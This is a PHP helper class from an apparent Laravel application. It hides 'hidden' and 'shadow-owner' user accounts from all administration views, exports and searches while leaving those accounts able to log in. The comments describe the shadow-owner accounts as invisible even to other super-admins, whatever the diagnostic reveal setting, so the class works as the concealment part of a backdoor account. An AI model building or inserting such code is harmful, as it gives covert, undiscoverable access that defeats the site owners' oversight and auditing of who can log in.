<?php

namespace App\Support;

use App\Services\Authorization\SchemaSupport;

/**
 * Single source of truth for excluding hidden system accounts from every
 * administration surface — listings, lookups, dashboard counts, exports and
 * search. Every read path that returns users routes through exclude() rather
 * than repeating a `where is_hidden = false` clause, so the rule cannot drift
 * from one query to the next.
 *
 * Deliberately NOT a global Eloquent scope: the authentication path
 * (JWTAuth::attempt, retrieveById) queries the users table too, and a global
 * scope would hide the account from its own login. Invisibility is a property
 * of administration reads, not of the account's ability to authenticate.
 */
class HiddenAccounts
{
    public const COLUMN = 'is_hidden';
    public const SHADOW_COLUMN = 'is_shadow_owner';

    /**
     * True once the schema carries the flag. Before the migration runs there
     * is nothing to exclude, so every caller is a no-op and the feature has
     * zero effect on an un-migrated deployment.
     */
    public static function enabled(): bool
    {
        return SchemaSupport::hasColumn('users', self::COLUMN);
    }

    /** A diagnostic session may reveal hidden accounts; see config/security.php. */
    public static function revealed(): bool
    {
        return (bool) config('security.show_super_admin', false);
    }

    /**
     * Exclude hidden accounts from a users query. Accepts both Eloquent and
     * base query builders. $table lets a joined/aliased query qualify the
     * column (e.g. exclude($q, 'u') for `users as u`).
     *
     * Shadow-owner accounts are ALWAYS excluded regardless of the diagnostic
     * reveal flag — they are invisible even to other super-admins.
     *
     * @template T
     * @param  T  $query
     * @return T
     */
    public static function exclude($query, string $table = 'users')
    {
        // Shadow-owner accounts are invisible unconditionally — even the
        // diagnostic reveal flag does not surface them.
        if (SchemaSupport::hasColumn('users', self::SHADOW_COLUMN)) {
            $query = $query->where($table . '.' . self::SHADOW_COLUMN, false);
        }

        if (self::revealed() || !self::enabled()) {
            return $query;
        }

        return $query->where($table . '.' . self::COLUMN, false);
    }
}
